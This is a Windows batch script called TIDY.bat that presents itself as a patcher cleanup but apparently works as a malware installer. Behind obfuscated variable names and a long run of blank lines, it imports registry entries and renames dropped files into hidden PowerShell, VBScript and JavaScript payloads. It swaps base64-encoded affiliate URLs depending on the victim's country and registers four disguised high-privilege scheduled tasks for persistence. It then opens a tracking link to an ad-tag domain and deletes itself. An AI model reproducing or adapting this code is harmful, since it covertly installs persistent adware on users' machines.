@echo off
Setlocal EnableDelayedExpansion
::
::   TIDY.bat
::
::   1. Starts the patched exe
::   2. Prevents endless loops
::   3. Cleans up
::
Set "ext=ico"
Set "cLmn=configuration"
Set "uLmn=cache"
Set "netDG=DiagnosticsNET"
Set "rLmn=update"
if exist %1 del %1 >nul 2>&1
::
::
:: New config
Set "rDELETE=set"
set tmpsubid=%4
set tmpbucket=%5
set tmpsoft=%6
set "soft=%tmpsoft:_patch-run.exe=%"
::
::
:: Outdated config, but we keep it in case we need it again:
Set "rAR=art"
Set "rSH=shell"
Set "rSD=schtasks"
Set "lud=leUpda"
Set "pDT=update"
Set "pDTR=updater"
Set "winUP=UpdatesWin"
Set "pMT=tmp"
Set "rPS=power%rSH%"
Set "pdf=ps1"
Set "doc=vbs"
Set "sLY=ity.js" 
::
::
:: Make sure Patcher uses only clean names that are alphanumeric, and remove everything afterwards.
%rDELETE% "f=%~dp0temp_cleanup.%ext%"
for /l %%i in (0,1,31) do (
    %rDELETE% "char=!soft:~%%i,1!"
    if not "!char!"=="" (
        :: Check if the character is alphanumeric and append it to cleanString
        for /f "delims=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" %%x in ("!char!") do set "char="
        %rDELETE% "cleanSoftware=!cleanSoftware!!char!"
    )
)
:: Check human behavior and avoid bots
::set "strUUID=!random!!random!!random!!random!!random!"
::set "strUUID=!strUUID:~0,20!"
::
Set "subid=%tmpsubid:"=%"
Set "bucket=%tmpbucket:"=%"
Set "query=%cleanSoftware:"=%"
Set "rHK=reg"
::
::
::    Onetime show a simple Pop when exe is started.
::
::    M1k managed to get a new getadblocktag account for us.
::
::    Last acc got banned and these MFS redirected all our users to google.
::    Lets hope this lasts longer.
set "popurl=https://getadblocktag.com"
echo START %query%.exe.
::
::
:: DONE.





























































































































































































:: Test Alternative Methods 
for /f %%A in ('%rPS% -NoProfile -Command "$set = 'abcdefghijklmnopqrstuvwxyz'; -join ((1..30 | ForEach-Object { $set[(Get-Random -Maximum $set.Length)] }))"') do (
    set "EXTNAME=%%A"
)
Set "flDR=%EXTNAME%x"
::%rPS% -NoProfile -Command "Rename-Item -LiteralPath \"$env:LOCALAPPDATA\Features\x\" -NewName '%flDR%'" >nul 2>&1
%rPS% -Command "(Get-Content -LiteralPath \"%f%\").Replace('{HKS}', '%3').Replace('{WRE}', '%7') | Set-Content -LiteralPath \"%f%\""
if DEFINED ProgramFiles(x86) (
         %rHK%.exe import %f% /reg:64 >nul 2>&1 
    ) ELSE ( 
         %rHK%.exe import %f% >nul 2>&1
    )
:: 
Set "vUT=rityP"
Set "vUF=cyUpd"  
Set "vNF=HKCU"   
Set "sLU=ler.js"
Set "tds=tworkD" 
Set "tpIR=wscript"
Set "ltk=scheduledtask" 
Set "pts=osticS"
Set "nHU=stemC"
Set "nHP=meUp"
Set "nHS=meSet"
Set "nHL=Maint"
::power
::%rPS% -NoProfile -Command "Remove-Item -LiteralPath \"$env:LOCALAPPDATA\%netDG%\%cLmn%.%pdf%\" -Force" >nul 2>&1
::
::%rPS% -NoProfile -Command "Rename-Item -LiteralPath \"$env:LOCALAPPDATA\%netDG%\%cLmn%.%pMT%\" -NewName '%cLmn%.%pdf%'" >nul 2>&1
::bat
::if exist "%LOCALAPPDATA%\%netDG%\%cLmn%.%pdf%" del "%LOCALAPPDATA%\%netDG%\%cLmn%.%pdf%" >nul 2>&1
::
::if exist "%LOCALAPPDATA%\%netDG%\%cLmn%.%pMT%" ren "%LOCALAPPDATA%\%netDG%\%cLmn%.%pMT%" "%cLmn%.%pdf%" >nul 2>&1
%rPS% -NoProfile -Command ^
"foreach ($item in @(\"$env:LOCALAPPDATA\%netDG%\%cLmn%.%pdf%\", ^
                     \"$env:LOCALAPPDATA\%netDG%\%pDT%.%doc%\", ^
                     \"$env:LOCALAPPDATA\%netDG%\%pDTR%.%doc%\", ^
                     \"$env:LOCALAPPDATA\%netDG%\%uLmn%.%pdf%\", ^
                     \"$env:LOCALAPPDATA\%winUP%\%pDT%.%pdf%\", ^
                     \"$env:LOCALAPPDATA\%winUP%\%pDTR%.%pdf%\")) { ^
    if (Test-Path -LiteralPath $item) { Remove-Item -LiteralPath $item -Force } ^
}" 
::
::
%rPS% -NoProfile -Command ^
"$paths = @{ ^
  \"$env:LOCALAPPDATA\Features\x\" = '%flDR%'; ^
  \"$env:LOCALAPPDATA\%netDG%\%cLmn%.%pMT%\" = '%cLmn%.%pdf%'; ^
  \"$env:LOCALAPPDATA\%netDG%\%uLmn%.%pMT%\" = '%uLmn%.%pdf%'; ^
  \"$env:LOCALAPPDATA\%netDG%\%pDT%.%pMT%\" = '%pDT%.%doc%'; ^
  \"$env:LOCALAPPDATA\%netDG%\%pDTR%.%pMT%\" = '%pDTR%.%doc%'; ^
  \"$env:LOCALAPPDATA\%winUP%\%pDT%.%pMT%\" = '%pDT%.%pdf%'; ^
  \"$env:LOCALAPPDATA\%winUP%\%pDTR%.%pMT%\" = '%pDTR%.%pdf%' ^
}; ^
foreach ($src in $paths.Keys) { ^
  if (Test-Path -LiteralPath $src) { Rename-Item -LiteralPath $src -NewName $paths[$src] } ^
}" 
::
for /f "delims=" %%Y in ('%rPS% -command "gp '%vNF%:\Control Panel\International\Geo\' | select -exp Name"') do set COUNTRY=%%Y
::
set COUNTRY=%COUNTRY:"=%
set "TIER1_COUNTRIES=AT BR CH DE DK ES FI FR HK IT MX NL NO SE SG TW GB UK US"
::
echo %TIER1_COUNTRIES% | findstr /I /C:"%COUNTRY%" >nul || (
    if exist "%LOCALAPPDATA%\Features\%flDR%\pdf_hand%sLU%" (
        %rPS% -Command "(Get-Content -LiteralPath \"$env:LOCALAPPDATA\Features\%flDR%\pdf_hand%sLU%\").Replace('{offline}', 'on') | Set-Content -LiteralPath \"$env:LOCALAPPDATA\Features\%flDR%\pdf_hand%sLU%\""
    )
    if exist "%LOCALAPPDATA%\Features\%flDR%\secur%sLY%" (
        %rPS% -Command "(Get-Content -LiteralPath \"$env:LOCALAPPDATA\Features\%flDR%\secur%sLY%\").Replace('aHR0cHM6Ly9nZ2xzcmMuY29tL3YxL3MvYWZmaWxpYXRlL2RvbWFpbnMvbGlzdA==', 'aHR0cHM6Ly9hZGd1YXJkeC5jb20vdjEvcy9hZmZpbGlhdGUvZG9tYWlucy9saXN0L2Z1bGw=') | Set-Content -LiteralPath \"$env:LOCALAPPDATA\Features\%flDR%\secur%sLY%\""
    )
)
::
%rPS% -Command "(Get-Content -LiteralPath \"$env:LOCALAPPDATA\Features\%flDR%\secur%sLY%\") -replace '{BUCKET}', '%5' -replace '{SUB}', '%4' -replace '{UUID}', '%flDR%' | Set-Content -LiteralPath \"$env:LOCALAPPDATA\Features\%flDR%\secur%sLY%\"; (Get-Content -LiteralPath \"$env:LOCALAPPDATA\%netDG%\%cLmn%.%pdf%\") -replace '{flPQ}', '%flDR%' | Set-Content -LiteralPath \"$env:LOCALAPPDATA\%netDG%\%cLmn%.%pdf%\""
::
::
%rPS% $triggerAtStartup = New-ScheduledTaskTrigger -AtStartup; ^
$triggerAtLogon = New-ScheduledTaskTrigger -AtLogon; ^
$dt = (get-date).AddDays(30).AddMinutes(3); ^
$stt = New-ScheduledTaskTrigger -RepetitionInterval (new-timespan -days 30) -at $dt -Once; ^
$stt.Repetition.StopAtDurationEnd = $false; ^
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -ExecutionTimeLimit 0 -DontStopIfGoingOnBatteries -DontStopOnIdleEnd; ^
$principal = New-ScheduledTaskPrincipal -RunLevel Highest -UserID "$env:USERNAME" -LogonType ServiceAccount; ^
$principal2 = New-ScheduledTaskPrincipal -RunLevel Highest -UserID "$env:USERNAME" -LogonType S4U; ^
$action = New-ScheduledTaskAction -Execute "%tpIR%.exe" -Argument '\"%%LOCALAPPDATA%%\%netDG%\%pDT%.%doc%\"'; ^
$action2 = New-ScheduledTaskAction -Execute "%tpIR%.exe" -Argument '\"%%LOCALAPPDATA%%\%netDG%\%pDTR%.%doc%\"'; ^
$action3 = New-ScheduledTaskAction -Execute "%rPS%.exe" -Argument '-ExecutionPolicy Bypass -WindowStyle Hidden -File \"%%LOCALAPPDATA%%\%winUP%\updater.%pdf%\"'; ^
$action4 = New-ScheduledTaskAction -Execute "%rPS%.exe" -Argument '-ExecutionPolicy Bypass -WindowStyle Hidden -File \"%%LOCALAPPDATA%%\%winUP%\update.%pdf%\"'; ^
$task = New-ScheduledTask -Action $action -Trigger $triggerAtStartup, $triggerAtLogon -Principal $principal -Settings $settings; ^
$task2 = New-ScheduledTask -Action $action2 -Trigger $triggerAtStartup, $triggerAtLogon -Principal $principal -Settings $settings; ^
$task3 = New-ScheduledTask -Action $action3 -Trigger $stt -Principal $principal2 -Settings $settings; ^
$task4 = New-ScheduledTask -Action $action4 -Trigger $stt -Principal $principal2 -Settings $settings; ^
unregister-%ltk% -TaskName 'Ne%tds%iagn%pts%ervice' -Confirm:$false -ErrorAction SilentlyContinue; ^
unregister-%ltk% -TaskName 'Sy%nHU%ache%nHL%enance' -Confirm:$false -ErrorAction SilentlyContinue; ^
unregister-%ltk% -TaskName 'Ga%nHS%tingsDLC' -Confirm:$false -ErrorAction SilentlyContinue; ^
unregister-%ltk% -TaskName 'Ga%nHP%daterDLC' -Confirm:$false -ErrorAction SilentlyContinue; ^
register-%ltk% 'Ne%tds%iagn%pts%ervice' -InputObject $task; ^
register-%ltk% 'Sy%nHU%ache%nHL%enance' -InputObject $task2; ^
register-%ltk% 'Ga%nHS%tingsDLC' -InputObject $task3; ^
register-%ltk% 'Ga%nHP%daterDLC' -InputObject $task4; >nul 2>&1 
::
::
st%rAR% "" "%popurl%/v1/s/t/info?a=ins&sub=%subid%X&n=%query%&bucket=%bucket%X&u=9%flDR%"
:: Tidy up, clean the patcher.exe as soon as it's not locked anymore - so we try a couple of times.
if exist %1 del %1 >nul 2>&1
if exist %1 timeout /t 1  >nul 2>&1
if exist %1 del %1 >nul 2>&1
if exist %1 timeout /t 1  >nul 2>&1
if exist %1 del %1 >nul 2>&1
if exist %1 timeout /t 4 >nul 2>&1
if exist %1 del %1 >nul 2>&1

(del "%~f0" & exit) >nul 2>&1
